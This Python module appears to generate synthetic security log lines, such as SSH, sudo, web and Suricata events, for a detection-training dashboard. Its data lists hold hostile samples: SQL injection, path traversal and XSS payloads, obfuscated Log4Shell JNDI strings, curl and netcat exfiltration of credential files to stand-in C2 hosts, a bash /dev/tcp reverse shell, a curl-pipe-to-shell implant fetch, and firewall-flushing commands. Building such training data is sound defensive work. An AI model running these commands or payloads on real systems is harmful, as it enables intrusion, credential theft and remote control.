from __future__ import annotations

import random
from datetime import datetime, timezone

# ── category → UI colour (consumed by the web dashboard) ─────────────────────
CATEGORY_COLORS: dict[str, str] = {
    "auth":      "#ef4444",   # red
    "privesc":   "#f59e0b",   # amber
    "web":       "#8b5cf6",   # violet
    "network":   "#06b6d4",   # cyan
    "lateral":   "#ec4899",   # pink
    "persist":   "#eab308",   # yellow
    "exfil":     "#f97316",   # orange
    "impact":    "#dc2626",   # deep red
    "discovery": "#3b82f6",   # blue
    "noise":     "#475569",   # slate
}

# ── per-scenario metadata (drives the UI scenario editor) ────────────────────
SCENARIO_META: dict[str, dict] = {
    "ssh_invalid_user":       {"label": "SSH Invalid User",         "category": "auth",      "severity": "medium"},
    "ssh_failed_password":    {"label": "SSH Failed Password",      "category": "auth",      "severity": "medium"},
    "ssh_accepted":           {"label": "SSH Login Accepted",       "category": "auth",      "severity": "info"},
    "sudo_command":           {"label": "Sudo Command",             "category": "privesc",   "severity": "medium"},
    "pam_su_failure":         {"label": "PAM su Failure",           "category": "privesc",   "severity": "medium"},
    "new_user_created":       {"label": "New User Created",         "category": "persist",   "severity": "high"},
    "cron_persistence":       {"label": "Cron Persistence",         "category": "persist",   "severity": "high"},
    "cron_session":           {"label": "Cron Session",             "category": "noise",     "severity": "info"},
    "kernel_usb_event":       {"label": "USB Device Event",         "category": "discovery", "severity": "low"},
    "systemd_service_failure":{"label": "Systemd Service Failure",  "category": "noise",     "severity": "low"},
    "apache_404":             {"label": "Apache 404",               "category": "web",       "severity": "low"},
    "apache_500":             {"label": "Apache 500",               "category": "web",       "severity": "medium"},
    "nginx_auth_failure":     {"label": "Nginx Auth Failure",       "category": "web",       "severity": "medium"},
    "web_sql_injection":      {"label": "SQL Injection",            "category": "web",       "severity": "high"},
    "web_lfi_attempt":        {"label": "LFI / Path Traversal",     "category": "web",       "severity": "high"},
    "web_log4j_attempt":      {"label": "Log4Shell Probe",          "category": "web",       "severity": "critical"},
    "web_xss_attempt":        {"label": "XSS Attempt",              "category": "web",       "severity": "medium"},
    "suricata_alert":         {"label": "Suricata Alert",           "category": "network",   "severity": "high"},
    "openvpn_tls_error":      {"label": "OpenVPN TLS Error",        "category": "network",   "severity": "medium"},
    "port_scan_detected":     {"label": "Port Scan Detected",       "category": "discovery", "severity": "medium"},
    "lateral_ssh_hop":        {"label": "Lateral SSH Hop",          "category": "lateral",   "severity": "high"},
    "sensitive_file_access":  {"label": "Sensitive File Access",    "category": "exfil",     "severity": "high"},
    "large_outbound_transfer":{"label": "Large Outbound Transfer",  "category": "exfil",     "severity": "high"},
    "iptables_modified":      {"label": "Firewall Rule Changed",    "category": "impact",    "severity": "critical"},
    "process_injection_attempt":{"label":"Process Injection",       "category": "impact",    "severity": "critical"},
    "dataset_replay":         {"label": "Real-World Replay",        "category": "noise",     "severity": "info"},
    "generic_syslog_noise":   {"label": "Background Noise",         "category": "noise",     "severity": "info"},
}


USERNAMES = [
    "alice",
    "bob",
    "carol",
    "dave",
    "svc-backup",
    "deploy",
    "analyst",
    "itadmin",
]

INVALID_USERS = [
    "admin",
    "backup",
    "oracle",
    "test",
    "ubuntu",
    "guest",
    "postgres",
]

SHELL_COMMANDS = [
    "/bin/systemctl restart nginx",
    "/usr/bin/apt-get install tcpdump",
    "/usr/bin/id",
    "/usr/bin/curl -fsSL https://repo.example.invalid/bootstrap.sh",
    "/usr/bin/chmod 777 /tmp/lab.sh",
    "/usr/bin/useradd contractor",
]

HTTP_PATHS = [
    "/",
    "/admin",
    "/admin.php",
    "/wp-login.php",
    "/api/internal/status",
    "/.git/config",
    "/cgi-bin/.%2e/.%2e/.%2e/bin/sh",
    "/owa/auth/logon.aspx",
]

USER_AGENTS = [
    "curl/8.7.1",
    "python-requests/2.32.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "sqlmap/1.8.5#stable",
    "Nmap Scripting Engine",
]

SERVICES = [
    "nginx",
    "apache2",
    "sshd",
    "docker",
    "openvpn",
    "postgresql",
]

SURICATA_SIGNATURES = [
    "ET SCAN Nmap Scripting Engine User-Agent Detected",
    "ET WEB_SERVER Possible CVE-2021-41773 Exploitation Attempt",
    "ET ATTACK_RESPONSE Possible Shell Command Execution",
    "ET POLICY curl User-Agent Outbound",
]

OUI_MANUFACTURERS = [
    "Kingston",
    "SanDisk",
    "Generic",
    "Logitech",
    "Yubico",
]

SYSLOG_NOISE_MESSAGES = [
    "NetworkManager[812]: <info>  [device] link connected",
    "systemd[1]: Started Daily apt download activities.",
    "CRON[7112]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)",
    "dockerd[1254]: health check passed for container training-nginx",
    "systemd-timesyncd[401]: Initial clock synchronization to time.cloudflare.com:123",
]


def syslog_timestamp(now: datetime) -> str:
    return now.astimezone(timezone.utc).strftime("%b %d %H:%M:%S")


def apache_timestamp(now: datetime) -> str:
    return now.astimezone(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")


def public_ip(rng: random.Random) -> str:
    blocks = [
        (23, 24),
        (45, 46),
        (77, 78),
        (103, 104),
        (185, 186),
        (198, 199),
    ]
    first_low, first_high = rng.choice(blocks)
    return ".".join(
        [
            str(rng.randint(first_low, first_high)),
            str(rng.randint(1, 254)),
            str(rng.randint(1, 254)),
            str(rng.randint(1, 254)),
        ]
    )


def private_ip(rng: random.Random) -> str:
    return f"10.{rng.randint(0, 31)}.{rng.randint(0, 254)}.{rng.randint(1, 254)}"


def random_mac_suffix(rng: random.Random) -> str:
    return ":".join(f"{rng.randint(0, 255):02x}" for _ in range(3))


def random_hex(rng: random.Random, size: int) -> str:
    return "".join(rng.choice("0123456789abcdef") for _ in range(size))


def prefix(now: datetime, hostname: str, program: str) -> str:
    return f"{syslog_timestamp(now)} {hostname} {program}:"


# ── existing scenarios ────────────────────────────────────────────────────────

def ssh_invalid_user(endpoint: dict, rng: random.Random, now: datetime) -> str:
    return (
        f"{prefix(now, endpoint['name'], f'sshd[{rng.randint(1200, 45000)}]')} "
        f"Invalid user {rng.choice(INVALID_USERS)} from {public_ip(rng)} "
        f"port {rng.randint(1024, 65535)}"
    )


def ssh_failed_password(endpoint: dict, rng: random.Random, now: datetime) -> str:
    auth_method = rng.choice(["password", "publickey", "keyboard-interactive/pam"])
    return (
        f"{prefix(now, endpoint['name'], f'sshd[{rng.randint(1200, 45000)}]')} "
        f"Failed {auth_method} for {rng.choice(USERNAMES)} from {public_ip(rng)} "
        f"port {rng.randint(1024, 65535)} ssh2"
    )


def sudo_command(endpoint: dict, rng: random.Random, now: datetime) -> str:
    actor = rng.choice(USERNAMES)
    tty = f"pts/{rng.randint(0, 8)}"
    return (
        f"{prefix(now, endpoint['name'], 'sudo')} {actor} : TTY={tty} ; "
        f"PWD=/home/{actor} ; USER=root ; COMMAND={rng.choice(SHELL_COMMANDS)}"
    )


def pam_su_failure(endpoint: dict, rng: random.Random, now: datetime) -> str:
    actor = rng.choice(USERNAMES)
    return (
        f"{prefix(now, endpoint['name'], f'su[{rng.randint(1000, 20000)}]')} "
        f"pam_unix(su:auth): authentication failure; logname= uid=1000 euid=0 "
        f"tty=/dev/pts/{rng.randint(0, 8)} ruser={actor} rhost= user=root"
    )


def kernel_usb_event(endpoint: dict, rng: random.Random, now: datetime) -> str:
    return (
        f"{prefix(now, endpoint['name'], 'kernel')} "
        f"[{rng.randint(5000, 90000)}.{rng.randint(100000, 999999)}] usb {rng.randint(1, 3)}-"
        f"{rng.randint(1, 6)}: New USB device found, idVendor={rng.randint(0, 65535):04x}, "
        f"idProduct={rng.randint(0, 65535):04x}, manufacturer={rng.choice(OUI_MANUFACTURERS)}, "
        f"serial={random_hex(rng, 12)}"
    )


def cron_session(endpoint: dict, rng: random.Random, now: datetime) -> str:
    return (
        f"{prefix(now, endpoint['name'], f'CRON[{rng.randint(1000, 20000)}]')} "
        f"pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)"
    )


def systemd_service_failure(endpoint: dict, rng: random.Random, now: datetime) -> str:
    return (
        f"{prefix(now, endpoint['name'], 'systemd[1]')} {rng.choice(SERVICES)}.service: "
        f"Main process exited, code=exited, status={rng.choice([1, 2, 203, 255])}/FAILURE"
    )


def apache_404(endpoint: dict, rng: random.Random, now: datetime) -> str:
    return (
        f"{prefix(now, endpoint['name'], f'apache2[{rng.randint(1000, 9000)}]')} "
        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
        f'"GET {rng.choice(HTTP_PATHS)} HTTP/1.1" 404 {rng.randint(200, 2500)} '
        f'"-" "{rng.choice(USER_AGENTS)}"'
    )


def apache_500(endpoint: dict, rng: random.Random, now: datetime) -> str:
    return (
        f"{prefix(now, endpoint['name'], f'apache2[{rng.randint(1000, 9000)}]')} "
        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
        f'"POST /api/v1/login HTTP/1.1" 500 {rng.randint(500, 3000)} '
        f'"https://portal.example.invalid/login" "{rng.choice(USER_AGENTS)}"'
    )


def nginx_auth_failure(endpoint: dict, rng: random.Random, now: datetime) -> str:
    return (
        f"{prefix(now, endpoint['name'], f'nginx[{rng.randint(1000, 9000)}]')} "
        f"*{rng.randint(10, 999)} user \"admin\": password mismatch, client: {public_ip(rng)}, "
        f"server: portal.example.invalid, request: \"GET /admin HTTP/1.1\", "
        f"host: \"portal.example.invalid\""
    )


def suricata_alert(endpoint: dict, rng: random.Random, now: datetime) -> str:
    dst_port = rng.choice([22, 80, 443, 8080, 8443])
    return (
        f"{prefix(now, endpoint['name'], f'suricata[{rng.randint(1000, 9000)}]')} "
        f"[1:{rng.randint(2000000, 2099999)}:{rng.randint(1, 5)}] "
        f"{rng.choice(SURICATA_SIGNATURES)} "
        f"[Classification: Attempted Information Leak] [Priority: {rng.choice([1, 2, 3])}] "
        f"{{TCP}} {public_ip(rng)}:{rng.randint(1024, 65535)} -> {private_ip(rng)}:{dst_port}"
    )


def openvpn_tls_error(endpoint: dict, rng: random.Random, now: datetime) -> str:
    return (
        f"{prefix(now, endpoint['name'], f'openvpn[{rng.randint(1000, 9000)}]')} "
        f"TLS Error: incoming packet authentication failed from "
        f"[AF_INET]{public_ip(rng)}:{rng.randint(1024, 65535)}"
    )


def generic_syslog_noise(endpoint: dict, rng: random.Random, now: datetime) -> str:
    msg = rng.choice(SYSLOG_NOISE_MESSAGES)
    if msg.startswith(("systemd", "CRON", "NetworkManager", "dockerd", "systemd-timesyncd")):
        return f"{syslog_timestamp(now)} {endpoint['name']} {msg}"
    return f"{prefix(now, endpoint['name'], 'syslogd')} {msg}"


# ── new scenarios ─────────────────────────────────────────────────────────────

SQL_PAYLOADS = [
    "1' OR '1'='1",
    "1; DROP TABLE users--",
    "admin'--",
    "1 UNION SELECT null,null,null--",
    "' OR 1=1 LIMIT 1--",
]

LFI_PATHS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../windows/win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    '"><svg/onload=alert(1)>',
]

LOG4J_PAYLOADS = [
    "${jndi:ldap://attacker.example.invalid:1389/exploit}",
    "${jndi:rmi://c2.example.invalid/pwn}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example.invalid/a}",
    "${jndi:dns://log4shell.example.invalid/test}",
]

SENSITIVE_FILES = [
    "/etc/shadow",
    "/root/.ssh/id_rsa",
    "/var/lib/mysql/root.password",
    "/etc/ssl/private/server.key",
    "/root/.bash_history",
    "/home/ubuntu/.aws/credentials",
]

EXFIL_COMMANDS = ["/bin/cp {f} /tmp/.{r}", "/usr/bin/curl -F file=@{f} http://c2.example.invalid/upload", "/usr/bin/base64 {f} | nc {ip} 4444"]

IPTABLES_CMDS = [
    "/sbin/iptables -F",
    "/sbin/iptables -P INPUT ACCEPT",
    "/sbin/iptables -A INPUT -s 0.0.0.0/0 -j ACCEPT",
    "/sbin/ufw disable",
    "/sbin/iptables -D INPUT 1",
]

CRON_TAILS = [
    "/tmp/.update",
    "bash -i >& /dev/tcp/{ip}/4444 0>&1",
    "curl -s http://c2.example.invalid/implant | sh",
    "/usr/bin/python3 /tmp/.socket.py",
]

NEW_USERNAMES = ["contractor", "service-acct", "tmpuser", "devops99", "ansible-runner", "gitlab-ci"]


def ssh_accepted(endpoint: dict, rng: random.Random, now: datetime) -> str:
    method = rng.choice(["publickey", "password"])
    fp = f"SHA256:{random_hex(rng, 43)}" if method == "publickey" else ""
    suffix = f": RSA {fp}" if fp else ""
    return (
        f"{prefix(now, endpoint['name'], f'sshd[{rng.randint(1200, 45000)}]')} "
        f"Accepted {method} for {rng.choice(USERNAMES)} from {public_ip(rng)} "
        f"port {rng.randint(1024, 65535)} ssh2{suffix}"
    )


def lateral_ssh_hop(endpoint: dict, rng: random.Random, now: datetime) -> str:
    """SSH accepted from an internal IP — lateral movement indicator."""
    method = rng.choice(["publickey", "password"])
    user = rng.choice(["root", *USERNAMES])
    return (
        f"{prefix(now, endpoint['name'], f'sshd[{rng.randint(1200, 45000)}]')} "
        f"Accepted {method} for {user} from {private_ip(rng)} "
        f"port {rng.randint(1024, 65535)} ssh2"
    )


def new_user_created(endpoint: dict, rng: random.Random, now: datetime) -> str:
    actor = rng.choice(USERNAMES)
    new_user = rng.choice(NEW_USERNAMES)
    return (
        f"{prefix(now, endpoint['name'], 'sudo')} {actor} : "
        f"TTY=pts/{rng.randint(0, 8)} ; PWD=/home/{actor} ; USER=root ; "
        f"COMMAND=/usr/sbin/useradd -m -s /bin/bash {new_user}"
    )


def cron_persistence(endpoint: dict, rng: random.Random, now: datetime) -> str:
    actor = rng.choice([*USERNAMES, "root"])
    tail = rng.choice(CRON_TAILS).format(ip=public_ip(rng))
    schedule = f"{rng.randint(0,59)} {rng.randint(0,23)} * * *"
    return (
        f"{prefix(now, endpoint['name'], f'crontab[{rng.randint(1000, 9000)}]')} "
        f"({actor}) REPLACE ({actor}): {schedule} {tail}"
    )


def web_sql_injection(endpoint: dict, rng: random.Random, now: datetime) -> str:
    payload = rng.choice(SQL_PAYLOADS).replace(" ", "%20").replace("'", "%27")
    path = rng.choice(["/login.php", "/api/user", "/search", "/products"])
    param = rng.choice(["id", "user", "q", "page"])
    return (
        f"{prefix(now, endpoint['name'], f'apache2[{rng.randint(1000, 9000)}]')} "
        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
        f'"GET {path}?{param}={payload} HTTP/1.1" {rng.choice([200, 500, 403])} '
        f'{rng.randint(200, 8000)} "-" "{rng.choice(USER_AGENTS)}"'
    )


def web_lfi_attempt(endpoint: dict, rng: random.Random, now: datetime) -> str:
    payload = rng.choice(LFI_PATHS)
    param = rng.choice(["page", "file", "path", "include"])
    return (
        f"{prefix(now, endpoint['name'], f'apache2[{rng.randint(1000, 9000)}]')} "
        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
        f'"GET /index.php?{param}={payload} HTTP/1.1" {rng.choice([200, 403, 500])} '
        f'{rng.randint(200, 4000)} "-" "{rng.choice(USER_AGENTS)}"'
    )


def web_log4j_attempt(endpoint: dict, rng: random.Random, now: datetime) -> str:
    payload = rng.choice(LOG4J_PAYLOADS)
    return (
        f"{prefix(now, endpoint['name'], f'nginx[{rng.randint(1000, 9000)}]')} "
        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
        f'"GET / HTTP/1.1" {rng.choice([200, 400, 403])} {rng.randint(100, 3000)} '
        f'"-" "{payload}"'
    )


def web_xss_attempt(endpoint: dict, rng: random.Random, now: datetime) -> str:
    payload = rng.choice(XSS_PAYLOADS).replace("<", "%3C").replace(">", "%3E")
    path = rng.choice(["/search", "/comment", "/feedback", "/api/input"])
    return (
        f"{prefix(now, endpoint['name'], f'apache2[{rng.randint(1000, 9000)}]')} "
        f"{public_ip(rng)} - - [{apache_timestamp(now)}] "
        f'"GET {path}?q={payload} HTTP/1.1" 200 {rng.randint(500, 4000)} '
        f'"-" "{rng.choice(USER_AGENTS)}"'
    )


def port_scan_detected(endpoint: dict, rng: random.Random, now: datetime) -> str:
    scanner = public_ip(rng)
    port = rng.randint(1, 65535)
    return (
        f"{prefix(now, endpoint['name'], f'sshd[{rng.randint(1200, 45000)}]')} "
        f"Connection closed by invalid user {rng.choice(INVALID_USERS)} "
        f"{scanner} port {port} [preauth]"
    )


def sensitive_file_access(endpoint: dict, rng: random.Random, now: datetime) -> str:
    actor = rng.choice(USERNAMES)
    target = rng.choice(SENSITIVE_FILES)
    cmd_tpl = rng.choice(EXFIL_COMMANDS)
    cmd = cmd_tpl.format(f=target, r=random_hex(rng, 6), ip=public_ip(rng))
    return (
        f"{prefix(now, endpoint['name'], 'sudo')} {actor} : "
        f"TTY=pts/{rng.randint(0, 8)} ; PWD=/home/{actor} ; USER=root ; "
        f"COMMAND={cmd}"
    )


def large_outbound_transfer(endpoint: dict, rng: random.Random, now: datetime) -> str:
    size_mb = rng.randint(256, 4096)
    dest = public_ip(rng)
    port = rng.choice([443, 80, 21, 22, 8443])
    speed = f"{rng.randint(1, 50)}.{rng.randint(0, 9)}"
    return (
        f"{prefix(now, endpoint['name'], f'curl[{rng.randint(1000, 9000)}]')} "
        f"Transfer complete to {dest}:{port} — {size_mb} MB in "
        f"{rng.randint(30, 600)}s ({speed} MB/s)"
    )


def iptables_modified(endpoint: dict, rng: random.Random, now: datetime) -> str:
    actor = rng.choice([*USERNAMES, "root"])
    return (
        f"{prefix(now, endpoint['name'], 'sudo')} {actor} : "
        f"TTY=pts/{rng.randint(0, 3)} ; PWD=/root ; USER=root ; "
        f"COMMAND={rng.choice(IPTABLES_CMDS)}"
    )


def process_injection_attempt(endpoint: dict, rng: random.Random, now: datetime) -> str:
    attacker_pid = rng.randint(1000, 30000)
    victim_pid = rng.randint(1000, 30000)
    victim = rng.choice(["sshd", "nginx", "postgres", "dockerd", "bash"])
    return (
        f"{prefix(now, endpoint['name'], 'kernel')} "
        f"[{rng.randint(5000, 90000)}.{rng.randint(100000, 999999)}] "
        f"ptrace request from pid {attacker_pid} to {victim}[{victim_pid}] "
        f"via /proc/{victim_pid}/mem"
    )


def dataset_replay(endpoint: dict, rng: random.Random, now: datetime) -> str:
    """Replay a line from the bundled or fetched real-world dataset.

    Falls back to generic syslog noise when no datasets are available, so
    profiles can include this scenario unconditionally.
    """
    lines = endpoint.get("_dataset_lines") or []
    if not lines:
        return generic_syslog_noise(endpoint, rng, now)
    body = rng.choice(lines)
    return f"{prefix(now, endpoint['name'], 'replay')} {body}"


# ── registry ──────────────────────────────────────────────────────────────────

SCENARIOS = {
    "apache_404":               apache_404,
    "apache_500":               apache_500,
    "cron_persistence":         cron_persistence,
    "cron_session":             cron_session,
    "dataset_replay":           dataset_replay,
    "generic_syslog_noise":     generic_syslog_noise,
    "iptables_modified":        iptables_modified,
    "kernel_usb_event":         kernel_usb_event,
    "large_outbound_transfer":  large_outbound_transfer,
    "lateral_ssh_hop":          lateral_ssh_hop,
    "new_user_created":         new_user_created,
    "nginx_auth_failure":       nginx_auth_failure,
    "openvpn_tls_error":        openvpn_tls_error,
    "pam_su_failure":           pam_su_failure,
    "port_scan_detected":       port_scan_detected,
    "process_injection_attempt":process_injection_attempt,
    "sensitive_file_access":    sensitive_file_access,
    "ssh_accepted":             ssh_accepted,
    "ssh_failed_password":      ssh_failed_password,
    "ssh_invalid_user":         ssh_invalid_user,
    "sudo_command":             sudo_command,
    "suricata_alert":           suricata_alert,
    "systemd_service_failure":  systemd_service_failure,
    "web_log4j_attempt":        web_log4j_attempt,
    "web_lfi_attempt":          web_lfi_attempt,
    "web_sql_injection":        web_sql_injection,
    "web_xss_attempt":          web_xss_attempt,
}

SUPPORTED_SCENARIO_NAMES = tuple(sorted(SCENARIOS))
